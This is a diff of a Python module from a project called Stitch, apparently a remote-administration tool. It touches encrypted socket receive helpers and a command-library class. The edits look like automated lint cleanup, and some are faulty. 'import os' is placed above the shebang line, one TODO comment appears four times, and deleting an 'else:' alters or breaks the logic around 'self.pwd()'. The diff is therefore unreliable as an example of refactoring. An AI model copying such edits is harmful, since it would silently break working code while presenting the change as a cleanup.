@@ -1,8 +1,13 @@
+import os
 #!/usr/bin/env python
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from .stitch_help import *
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from .stitch_utils import *
 
 def st_recvall(client, count, aes_enc=None, encryption=True):
@@ -30,7 +35,7 @@ def st_receive(client,aes_enc, as_string=False):
     if as_string:
         try:
             return full_response.decode('utf-8')
-        except:
+        except Exception:
             return full_response.decode('latin-1')
     return full_response
 
@@ -188,8 +193,7 @@ class stitch_commands_library:
             if not no_error(response):
                 st_print(response)
             else:
-                print
-        else:
+                pass
             self.pwd()
 
     def clear(self):
